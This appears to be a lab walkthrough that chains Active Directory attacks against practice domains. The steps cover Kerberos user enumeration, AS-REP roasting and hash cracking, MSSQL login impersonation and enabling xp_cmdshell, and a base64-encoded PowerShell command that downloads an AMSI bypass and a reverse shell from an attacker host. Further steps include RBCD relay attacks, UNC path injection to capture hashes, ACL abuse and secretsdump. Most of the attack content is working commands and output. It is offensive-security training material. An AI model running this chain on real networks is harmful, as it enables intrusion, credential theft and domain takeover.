# Manual

## Attack path visualized

![](<../../../../.gitbook/assets/image (68) (1).png>)

### 1. Enumerate Users

**Task: Enumerate valid domain users.**

It is possible to enumerate valid domain users by sending TGT requests to the DC. One tool which can do this is [Kerbrute](https://github.com/ropnop/kerbrute). But before we can use this tool we need a list of valid usernames. A repository with a lot of lists for these kind of things is [SecLists](https://github.com/danielmiessler/SecLists).

1. Download the required tools:

```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute
git clone https://github.com/danielmiessler/SecLists
```

2\. After downloading the tool and the username list, run Kerbrute against the domain `amsterdam.bank.local` and DC `10.0.0.3`. Pipe the command to `tee` to save the output to the txt file `username_enum.txt`.&#x20;

```
./kerbrute userenum -d amsterdam.bank.local --dc 10.0.0.3 /opt/SecLists/Usernames/xato-net-10-million-usernames.txt | tee username_enum.txt
```

![](<../../../../.gitbook/assets/image (72) (1) (1).png>)

3\. To only get a list of usernames execute the following which will cut the output to only get the usernames, changes everything to lowercase and sorting for unique entries:

```
cat username_enum.txt | grep bank.local | cut -d " " -f 8- | cut -d "@" -f 1 | sed 's/./\L&/g' | sort -u > users.txt
```

```
cat users.txt                                                                                                       
administrator
bank
bob
chris
dave
david
john
mark
mike
richard
robert
steve
thomas
```

### 2. AS-REP roast

**Task: Check if any of the valid users are vulnerable to a kerberos vulnerability.**

One of the vulnerabilities which can be exploited with just a list of usernames without having access to a valid domain user already is checking if any of the users has pre-authentication enabled. If they do we can execute the AS-REP roasting attack and hopefully crack their hash and retrieve a password.

Other attacks which are possible to do is password spraying or checking if the user has an empty password. Which won't be covered in this attack path. But its possible to gain access to other users by executing these attacks in the lab.

1. We can use the `GetNPUsers.py` script from impacket to check if any of the users have this attribute set and AS-REP roast them, saving the hashes to asreproasting.txt

```
GetNPUsers.py amsterdam/ -dc-ip 10.0.0.3 -usersfile users.txt -format hashcat -outputfile asreproasting.txt
```

![](<../../../../.gitbook/assets/image (9) (1).png>)

2\. The output doesn't show us any successes. But the file `kerberoasting.txt` is there and it has a hash:

![](<../../../../.gitbook/assets/image (67) (1).png>)

3\. We can crack the hash with Hashcat. I transfered the file to my host since cracking in a VM isn't really ideal, it can't use the GPU then. I always run hashcat with rockyou and the dive ruleset.

```
.\hashcat.exe -a 0 -m 18200 .\asreproasting.txt .\wordlists\rockyou.txt  -r .\rules\dive.rule
```

![](<../../../../.gitbook/assets/image (34).png>)

4\. I cracked the hash within seconds and we gained access to the domain as `Richard` with the password `Sample123`.

#### Optional:

1. After gaining access to a valid set of credentials I always like to run BloodHound immediately. I normally run the PowerShell version of the BloodHound ingestor, but since we don't have access to a machine yet and I'm not connected on my W10 VM to the lab. We can also run the [BloodHound.py](https://github.com/fox-it/BloodHound.py) ingestor from FoxIt.

```
git clone https://github.com/fox-it/BloodHound.py
bloodhound-python -d amsterdam.bank.local -ns 10.0.0.3 -dc DC02.amsterdam.bank.local -u 'Richard' -p 'Sample123' --zip -c all
```

![](<../../../../.gitbook/assets/image (2) (1).png>)

2\. We now can load the data into BloodHound by draggin the zip file into it and see if Richard can do anything usefull:

![](<../../../../.gitbook/assets/image (62) (1).png>)

Richard is member of the following groups, nothing interesting there:

![](<../../../../.gitbook/assets/image (66) (1) (1).png>)

The attributes of the user also doesn't show anything interesting:

![](<../../../../.gitbook/assets/image (15) (1) (1).png>)

### 3. Access SQL Server

**Task: Check if the user can access any system or service.**

#### Checking for access

To check if a user can access any systems I like to use [Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec). This tool can check if the user can authenticate to a list of targets using smb, winrm, mssql and ldap. It also supports ssh. This is a snippet from the help function:

![](<../../../../.gitbook/assets/image (47).png>)

1. We can check if the user can access anything over SMB, which by default a domain user can. If the user is local admin (which is what we need to really do anything over SMB, it will show Pwn3d!).

```
crackmapexec smb 10.0.0.0/24 -u richard -p Sample123
```

![](<../../../../.gitbook/assets/image (56) (1).png>)

It can access three hosts over SMB but unfortunately we aren't local admin to any of them. We can still check for any accessible shares by adding the `--shares` parameter.

```
crackmapexec smb 10.0.0.3 10.0.0.4 10.0.0.5 -u richard -p Sample123 --shares
```

![](<../../../../.gitbook/assets/image (54).png>)

After connecting to the share we see that this user can't access any of the subdirectories:

![](<../../../../.gitbook/assets/image (73) (1) (1).png>)

2\. Next we can check if the user can access any systems over winrm:

```
crackmapexec winrm 10.0.0.0/24 -u richard -p Sample123
```

![](<../../../../.gitbook/assets/image (32) (1).png>)

3\. We weren't able to authenticate to any machine over winrm. Now we check for SQL server with the mssql protocol:

```
crackmapexec mssql 10.0.0.0/24 -u richard -p Sample123
```

![](<../../../../.gitbook/assets/image (15) (1).png>)

Richard can connect to the SQL server running on `WEB01` `10.0.0.5`. But he isn't sysadmin yet.

4\. We can create a real connection with these credentials and the example script from impacket named [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py).

```
mssqlclient.py -windows-auth 'amsterdam/richard:Sample123'@10.0.0.5
```

![](<../../../../.gitbook/assets/image (9).png>)

### 4. Become sysadmin

**Task: Escalate privileges to sysadmin.**

1. With the following queries we can check if our user is sysadmin, although we already know from Crackmapexec that our user probably isn't sysadmin

```
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

![](<../../../../.gitbook/assets/image (29).png>)

2\. The 0 means we aren't sysadmin. So we have to find a way to become sysadmin. One of the ways I know of is checking if our user can impersonate any other user which we can check with the following querie:

```
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

![](<../../../../.gitbook/assets/image (14) (1) (1).png>)

3\. Seems like we can impersonate a User with the name Developer. We can do this with the following querie:

```
EXECUTE AS LOGIN = 'Developer'
```

But we get an error, because the user Developer can't use the database we are currently connected to:&#x20;

![](<../../../../.gitbook/assets/image (45).png>)

We can change the database to master; and try it again:

```
use master;
EXECUTE AS LOGIN = 'Developer'
```

![](<../../../../.gitbook/assets/image (39) (1).png>)

Seems like it worked, lets run the query again to check which user we are and if we are sysadmin:

```
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

![](<../../../../.gitbook/assets/image (18).png>)

4\. We impersonated the user Developer but still aren't sysadmin. We can check for impersonation permissions agains with the same query:

```
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

![](<../../../../.gitbook/assets/image (20).png>)

5\. We can now try to impersonate `sa`, but we get an error:

```
EXECUTE AS LOGIN = 'sa'
```

![](<../../../../.gitbook/assets/image (46) (1).png>)

6\. Lets try to impersonate `developer_test` and then check for sysadmin privileges and if impersonation is possible again:

```
EXECUTE AS LOGIN = 'developer_test'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

![](<../../../../.gitbook/assets/image (36).png>)

7\. Seems like we can finally impersonate `sa` now.

```
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

![](<../../../../.gitbook/assets/image (61) (1).png>)

8\. We are `sa` and have sysadmin privileges. We successfully escalated our privileges from domain user to `sa` with sysadmin privileges on the SQL Server.

### 5. Execute commands

**Task: Get a shell.**

1. The first step to execute commands is to check if xp\_cmdshell is enabled, we can do that by just executing xp\_cmdshell and see if it works:

```
EXEC master..xp_cmdshell 'whoami'
```

![](<../../../../.gitbook/assets/image (11) (1).png>)

2\. We receive an error that it is disabled. But we can try to enable it with the following querie:

```
EXEC sp_configure 'show advanced options',1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
```

![](<../../../../.gitbook/assets/image (10).png>)

Now we can try to execute the whoami command again and it worked:

![](<../../../../.gitbook/assets/image (63).png>)

3\. The next step is to gain a shell from WEB01. For this we need to prepare some files and setup a listerener before we execute a querie on the sql server.&#x20;

* Save the amsi bypass from [here](https://github.com/0xJs/RedTeaming\_CheatSheet/tree/main/windows-ad#amsi-bypass) to a file named `amsi.txt`.
* Download [Invoke-PowerShellTcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1) from Nishang: `wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1`
* Check the IP of the attacking: `ip a` (mine is 192.168.248.2 but yours will be different!).
* Add the following to a newline in Invoke-PowerShellTcp.ps1: `Invoke-PowershellTcp -Reverse -IPAddress <IP> -Port 443`
* Start a webserver on port 8090: `python3 -m http.server 8090`
* Start a listener on port 443: `nc -lvp 443`

![](<../../../../.gitbook/assets/image (35).png>)

4\. Now we need to change/type the payload we want to execute on the sql server. A method I learned to use is base64 encode the command we want to execute and use the -enc parameter inside PowerShell. This prevents a lot of issues with single and double qoutes.

* The payload we would like to execute which will download the amsi into memory and then execute the reverse shell after bypassing Windows Defenser amsi:

```
IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:8090/amsi.txt")); IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:8090/Invoke-PowerShellTcp.ps1"));
```

* We can save this payload with the following method and base64 encode it:

```
$str = 'IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:8090/amsi.txt")); IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:8090/Invoke-PowerShellTcp.ps1"));'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```

![](<../../../../.gitbook/assets/image (71) (1) (1) (1).png>)

* Now we can paste the base64 encoded string in the following querie:

```
EXEC xp_cmdshell 'powershell.exe -w hidden -enc <BASE64 STRING>';

EXEC xp_cmdshell 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAGEAbQBzAGkALgB0AHgAdAAiACkAKQA7ACAASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQApADsA'
```

5\. Now its time to execute the command and receive a shell. Amsi.txt and the reverse shell gets downloaded and the shell comes in from `WEB01` as `NT service\mssql$dev`:

![](<../../../../.gitbook/assets/image (16) (1) (1).png>)

### 6. Privesc RBCD

**Task: Escalate privileges on the machine with a delegation attack.**

One of the privilege escalation techniques that you don't see so much is doing a Resource Based Constrained Delegation attack by relaying the computerhash after forcing a webdav authentication to the attacker machine. To do the attack there are a few requirements which are:

* Low privileged shell on a machine
* An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
* WebDAV redirector feature must be installed on the victim machine. (W10 has it by default, but manually installed on server 2016 and later)
* A DNS record pointing to the attacker’s machine (By default authenticated users can do this).

1. The first requirement we already have, so lets check if the authenticated users can add computers to the domain. We can check this with Crackmapexec:

```
crackmapexec ldap 10.0.0.3 -u richard -p Sample123 -M MAQ
```

![](<../../../../.gitbook/assets/image (71) (1) (1).png>)

2\. The machine account qouta is 10, meaning we (all authenticated users) can create our own computerobject in the domain. So lets add our own computerobject, this can be done with PowerMad. First we have to download it on our attacking machine, in the same directory as our Webserver is already running:

```
wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
```

Now we can load it into the PowerShell session in the shell:

```
iex (iwr http://192.168.248.2:8090/Powermad.ps1 -usebasicparsing)
```

![](<../../../../.gitbook/assets/image (24).png>)

Then we can create our own computerobject with the name `FAKE01` and password `123456`.

```
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

![](<../../../../.gitbook/assets/image (73) (1).png>)

3\. The third requirement is that the WebDav director is installed. We can check this with the following PowerShell command in the shell:

```
Get-WindowsFeature WebDAV-Redirector
```

![](<../../../../.gitbook/assets/image (14) (1).png>)

4\. The last requirement is to create a DNS record back to our attacking machine, since the webdav connection won't work without a hostname to connect to. For this we need the [Invoke-DNSUpdate](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Invoke-DNSUpdate.ps1) script from PowerMad. So we download it again and import it in the shell and then run the command to add the dns entry `webdav.amsterdam.bank.local` to our attacking machine IP:

```
#Download on kali
wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Invoke-DNSUpdate.ps1

#Execute in the shell on web01
iex (iwr http://192.168.248.2:8090/Invoke-DNSUpdate.ps1 -usebasicparsing)
Invoke-DNSUpdate -DNSType A -DNSName webdav.amsterdam.bank.local -DNSData 192.168.248.2 -Realm amsterdam.bank.local
```

![](<../../../../.gitbook/assets/image (11).png>)

I also did a nslookup to check if the DNS record was created. The domain controller at 10.0.0.3 responded and gave us the correct attacker IP. We now have all our prerequisites. Time to escalate our privileges.

5\. Run NTLMRelay on our Kali machine and set it up so it will write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute that allows our created computerobject `FAKE01` to actonbehalf `WEB01`:

```
python3 /opt/impacket/examples/ntlmrelayx.py -t ldap://10.0.0.3 --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg
```

![](<../../../../.gitbook/assets/image (5) (1).png>)

6\. Next we need to download en load the Change-LockScreen.ps1 script from the nccgroup and load it into memory on the target:

```
wget https://raw.githubusercontent.com/nccgroup/Change-Lockscreen/masterChange-Lockscreen.ps1
iex (iwr http://192.168.248.2:8090/Change-Lockscreen.ps1 -usebasicparsing)
```

Now its time to execute the attack. A quick recap from one of our pages:

> Abuse the lockscreen image changing functionality to achieve a webdav network authentication as SYSTEM from the given computer. Then relay the authentication to the Active Directory LDAP service in order to set up Resource-Based Constrained Delegation to that specific machine.

Lets force the webdav request:

```
change-lockscreen -webdav \\webdav@80\
```

![](<../../../../.gitbook/assets/image (74) (1).png>)

Once we check our ntlmrelay tool output we see that it succesfully authenticated as WEB01$ to the LDAP port on the DC at `10.0.0.3`. And it says `FAKE01` can now impersonate users on `WEB01`.

7\. The next step is to impersonate a user and request tickets so we can authenticate. We can create a CIFS service ticket using `FAKE01` impersonating the domain admin `Administrator` using impackets getST.py script. Fill in the password `123456`.

```
getST.py amsterdam/FAKE01@10.0.0.5 -spn cifs/web01.amsterdam.bank.local -impersonate administrator -dc-ip 10.0.0.3
```

![](<../../../../.gitbook/assets/image (33).png>)

8\. Now we can use the ticket and authenticate with tools that support these, most (if not all) impacket tools support this. So we can run secretsdump.py to retrieve the local useraccount hashes.

```
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass web01.amsterdam.bank.local
```

![](<../../../../.gitbook/assets/image (1) (1).png>)

We retrieved the hash of the local administrator user and the cached hashes for two domain admins. These look like NTLM hashes but aren't. We can use the local admin hash though to authenticate to WEB01. We can do this with our good old tool crackmapexec.

9\. The next step is to execute commands and get a shell. You might wonder why don't you just use psexec.py from impacket, well because Defender will block it:

![](<../../../../.gitbook/assets/image (37).png>)

As said before, we can use the local administrator hash with Crackmapexec and execute commands with the `-x` flag.

```
crackmapexec smb 10.0.0.5 -u administrator -H a59cc2e81b2835c6b402634e584a8edc --local-auth -x whoami
```

![](<../../../../.gitbook/assets/image (72).png>)

That worked, but how can we get a shell? You remember the payload we generated to get a shell through SQL server. That will work here too. So lets copy that and place it in the x parameter.

```
nc -lvp 443
crackmapexec smb 10.0.0.5 -u administrator -H a59cc2e81b2835c6b402634e584a8edc --local-auth -x 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAGEAbQBzAGkALgB0AHgAdAAiACkAKQA7ACAASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQApADsA'
```

![](<../../../../.gitbook/assets/image (55) (1).png>)

And we received a shell as the local administrator. Gotta love PowerShell :)

### 7. Abuse SQL Link

**Task: Enumerate SQL Links to hop across trusts.**

1. We now fully own the server web01 which runs as a SQL Server. During our enumeration we didn't check for any SQL Links. We could do this manually in our connected mssqlclient.py session, but we could also use HeidiSQL from our Windows 10 machine. You might wonder why, but I prefer to use heidisql, especially with bigger queries and data returned. mssqlclient.py for example returns these things like:

![](<../../../../.gitbook/assets/image (70) (1).png>)

To do this we need to setup a port forward since our Windows 10 machine isn't connected to the lab. We can do this with socat. This will make our kali listen on port `1433` and redirect all traffic to `WEB01` (`10.0.0.5`) port `1433`. The SQL Server is running on default on port 1433.

```
socat tcp-l:1433,fork tcp:10.0.0.5:1433
```

{% hint style="info" %}
You can also do this to connect with the native windows Remote Desktop client instead of rdesktop or any linux remote desktop tool. I really prefer doing it that way.
{% endhint %}

On our Windows 10 machine we need to start [HeidiSQL](https://www.heidisql.com/) with a runas command to authenticate with windows credentials:

```
runas /netonly /user:amsterdam\richard c:\Tools\AD\HeidiSQL_11.3_64_Portable\heidisql.exe
```

Then we can connect to the database using the following setup:

![](<../../../../.gitbook/assets/image (68).png>)

{% hint style="info" %}
For this to work you will need to fill in the IP of your kali machine, which need to be in the same network as the Windows 10 machine.
{% endhint %}

2\. In HeidiSQL click on the Query tab and execute the following query to enumerate SQL links:

```
SELECT * FROM master..sysservers;
```

![](<../../../../.gitbook/assets/image (71) (1).png>)

3\. There is one SQL link to a sql server on `data01.secure.local`. We can try to query the linked server with the following query, using the openquery functionality:

```
SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'select @@version');
```

![](<../../../../.gitbook/assets/image (61).png>)

4\. We can also query the server to check if xp\_cmdshell is on so we can execute commands:

```
SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
```

![](<../../../../.gitbook/assets/image (56).png>)

Unfortunatelly it isn't enabled. We could try to enable it (and that works too if you configured it). But that is'n't the intended way for the attack path.

### 8. UNC Path injection

**Task: Perform a UNC Path injection and capture the hash of SQL Service user.**

SQL Servers by default runs as a local service under the context of the computeraccount. But it is possible that the SQL service is running as a domain user which is made for the SQL service. For example `sa_sql`. If we are able to capture its NTLMv2 hash we could try to crack it offline

1. Before we can try to capture hashes we should run [Responder](https://github.com/lgandx/Responder) on our attacking machine. Responder will listen on multiple ports such as SMB, SQL, FTP etc. For executing the attack we only need SMB (port 445). We can run Responder with the following command

```
sudo responder -I tun0
```

![](<../../../../.gitbook/assets/image (69).png>)

2\. The next step is to perform a UNC Path injection attack. One SQL function we can use for that is `xp_dirtree`. We can try the UNC Path injection with the following query in HeidiSQL, using the EXEC AT method to execute something through the link:

```
EXEC('xp_fileexist ''\\192.168.248.2\pwn''') AT "DATA01.SECURE.LOCAL"
```

![](<../../../../.gitbook/assets/image (5).png>)

3\. If we check our Responder output we can see that we captured the hash from the user `sa_sql` from the domain `Secure`.

![](<../../../../.gitbook/assets/image (38).png>)

### 9. Crack SQL account hash

**Task: Crack the hash of the SQL service user.**

1. We received a NTLMv2 hash from the `sa_sql` user, which we can try to crack if the password of the user isn't that strong. We can easily do this with Hashcat like we did during the AS-REP roasting. But this time we need another hashmode.

```
.\hashcat.exe -a 0 -m 5600 .\hash.txt .\wordlists\rockyou.txt  -r .\rules\dive.rule
```

![](<../../../../.gitbook/assets/image (30).png>)

We successfully cracked the hash of the `sa_sql` user, the password is `Iloveyou2`.

### 10. ACL - Write Owner & RCBCD

**Task: Check for ACL's and get access to the system.**

1. To enumerate ACL abuses I prefer to run BloodHound. We already gathered the information for `amsterdam.bank.local` but the `sa_sql` user is part of a different domain. To use BloodHound we need to know what the domain controller is for this domain. We can enumerate this in a lot of ways, the easiest way is to try to resolve the domain name:

```
nslookup secure.local
```

![](<../../../../.gitbook/assets/image (65) (1).png>)

2\. The IP for secure.local is `10.0.0.100`, we can quickly run Crackmapexec and see if we can connect to it over SMB:

```
crackmapexec smb 10.0.0.100
```

![](<../../../../.gitbook/assets/image (64).png>)

3\. The hostname is `DC03`, and the machine is part of `secure.local`. We probably found the domain controller. Lets run BloodHound with the gathered credentials to retrieve the domain data:

```
bloodhound-python -d secure.local -ns 10.0.0.100 -dc DC03.secure.local -u 'sa_sql' -p 'Iloveyou2' --zip -c all
```

![](<../../../../.gitbook/assets/image (26).png>)

We were able to successfully gather the BloodHound data. We can load it by dragging it into BloodHound like we did earlier. We can also find the `sa_sql` user now:

![](<../../../../.gitbook/assets/image (13) (1) (1).png>)

4\. Click on the user and scroll down in the "Node Info" till the "Outbound Control Rights" section. If there is any data here, it means the object has control on another object. Lets click on the number "1".

![](<../../../../.gitbook/assets/image (66) (1).png>)

We see that the user has WriteOwner permissions:

![](<../../../../.gitbook/assets/image (67).png>)

In BloodHound you can right click the Edge and click the ?Help function to get more information on how to abuse it:

![](<../../../../.gitbook/assets/image (13) (1).png>)

5\. One tool to do these ACL abuses is [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) from PowerSploit. So lets download that and load it into memory in the shell we have on `WEB01`.

```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
iex (iwr http://192.168.248.2:8090/PowerView.ps1 -usebasicparsing)
```

We also need to create a credential object for the `sa_sql` user since we need to execute the commands as that user. We can do that with the following powershell commands:

```
$password = ConvertTo-SecureString 'Iloveyou2' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('secure.local\sa_sql', $password)
```

The credentials are saved in the `$creds` variable now:

![](<../../../../.gitbook/assets/image (46).png>)

6\. Now we can use PowerView to query the domain controller from `secure.local` for the domain-object `DATA01` and retrieve the samaccountname and Owner attribute. We will receive a SID which we need to resolve as well;

```
Get-DomainObject -Identity data01 -SecurityMasks Owner -Domain secure.local -Credential $creds -Server 10.0.0.100 | select samaccountname, Owner
Get-DomainObject -Identity S-1-5-21-1498997062-1091976085-892328878-512 -Domain secure.local -Credential $creds -Server 10.0.0.100
```

![](<../../../../.gitbook/assets/image (73).png>)

7\. The current owner of `DATA01` is the Domain Admins group. Lets change that. We can change the owner of the object using the `Set-DomainObjectOwner` cmdlet. The command below will change the owner to `sa_sql`.

```
Set-DomainObjectOwner -Domain secure.local -Credential $creds -Server 10.0.0.100 -Identity DATA01 -OwnerIdentity sa_sql -Verbose
```

![](<../../../../.gitbook/assets/image (43).png>)

We didn't received any output, but we can execute the commands again to see who the owner is now.

![](<../../../../.gitbook/assets/image (19).png>)

The owner successfully changed.

8\. Since we are the owner of the object now we can change the permissions we have on the object. We can give ourself genericall rights. This can be done with PowerView and the cmdlet `Add-DomainObjectAcl`.

```
Add-DomainObjectAcl -Domain secure.local -Credential $creds -TargetDomain secure.local -TargetIdentity DATA01 -PrincipalDomain secure.local -PrincipalIdentity sa_sql -Rights All -Verbose
```

![](<../../../../.gitbook/assets/image (16) (1).png>)

9\. We didn't reveive any output but now we can check the current permissions by running BloodHound again and ingesting the data:

![](<../../../../.gitbook/assets/image (65).png>)

10\. We have a lot of permissions now. Since `DATA01` doesn't have LAPS installed unfortunately, we need to execute another Resource Based Constrained Delegation attack. The one known as the computer object takeover. To execute this attack there are two requirements:

* An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
* A user with write privileges over the target computer which doesn't have msds-AllowedToActOnBehalfOfOtherIdentity

11\. The first requirement we already know how to do. So lets do what we did previously. Check for the machine account qouta in the `secure.local` domain.&#x20;

```
crackmapexec ldap 10.0.0.100 -u sa_sql -p Iloveyou2 -M MAQ
```

![](<../../../../.gitbook/assets/image (12).png>)

Then create a credential object, load PowerMad and add a computerobject to the domain:

```
$password = ConvertTo-SecureString 'Iloveyou2' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('secure.local\sa_sql', $password)
iex (iwr http://192.168.248.2:8090/Powermad.ps1 -usebasicparsing)
New-MachineAccount -Domain secure.local -Credential $creds -DomainController 10.0.0.100 -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

![](<../../../../.gitbook/assets/image (66).png>)

We successfully created the computerobject `FAKE01` in the `secure.local` domain.

12\. The second requirement we already have, we gave `sa_sql` genericall permissions to `DATA01`. But we can check if the `msds-AllowedToActOnBehalfOfOtherIdentity` attribute is empty with PowerView.

```
iex (iwr http://192.168.248.2:8090/PowerView.ps1 -usebasicparsing)
Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 Data01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

![](<../../../../.gitbook/assets/image (32).png>)

13\. The attribute haven't been set. Before we can write to it, we need to prepare the descriptor. First we need to get the SID of the computerobject `FAKE01` which we created. We can request this with PowerView:

```
Get-DomainComputer fake01 -Domain secure.local -Credential $creds -Server 10.0.0.100 | Select-Object samaccountname, objectsid
```

![](<../../../../.gitbook/assets/image (70).png>)

Now we need to create the raw security descriptor which we then will write to the attribute:

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1498997062-1091976085-892328878-1601)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

![](<../../../../.gitbook/assets/image (16).png>)

14\. Now we can write as `sa_sql` to the `msds-allowedtoactonbehalfofotheridentity` attribute of the computerobject `DATA01`:

```
Get-DomainComputer DATA01 -Domain secure.local -Credential $creds -Server 10.0.0.100 | Set-DomainObject -Domain secure.local -Credential $creds -Server 10.0.0.100 -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

![](<../../../../.gitbook/assets/image (15).png>)

We didn't get any output since we are in a shell. But we can check the attribute again to see of it worked:

![](<../../../../.gitbook/assets/image (75).png>)

Seems like it worked, now we can check the value of the `msds-AllowedToActOnBehalfOfOtherIdentity` attribute by saving it in a variable and doing some PowerShell confu to decrypt it:

```
$RawBytes = Get-DomainComputer DATA01 -Domain secure.local -Credential $creds -Server 10.0.0.100 -Properties 'msds-allowedtoactonbehalfofotheridentity' | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity
(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 S-1-5-21-1498997062-1091976085-892328878-1601 | Select-Object samaccountname
```

![](<../../../../.gitbook/assets/image (74).png>)

15\. The next step is to impersonate a user and request tickets so we can authenticate. We can create a CIFS service ticket using `FAKE01` impersonating the domain admin Administrator using impackets getST.py script. Fill in the password `123456`.

```
getST.py secure/FAKE01@10.0.0.100 -spn cifs/data01.secure.local -impersonate administrator -dc-ip 10.0.0.100
```

![](<../../../../.gitbook/assets/image (71).png>)

Now we can use the ticket and authenticate with tools that support these, most (if not all) impacket tools support this. So we can run secretsdump.py to retrieve the local useraccount hashes.

```
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass data01.secure.local
```

![](<../../../../.gitbook/assets/image (1).png>)

16\. We retrieved the hash of the local administrator user. We can use the local admin hash though to authenticate to `DATA01`.&#x20;

```
crackmapexec smb 10.0.0.101 -u administrator -H a59cc2e81b2835c6b402634e584a8edc -x whoami
```

![](<../../../../.gitbook/assets/image (13).png>)

17\. We could get a shell the same way as we did before.

```
crackmapexec smb 10.0.0.101 -u administrator -H a59cc2e81b2835c6b402634e584a8edc --local-auth -x 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAGEAbQBzAGkALgB0AHgAdAAiACkAKQA7ACAASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQApADsA'
```

![](<../../../../.gitbook/assets/image (14).png>)

### 11. Dumping DPAPI

**Task: Look for saved credentials on the machine (DPAPI).**

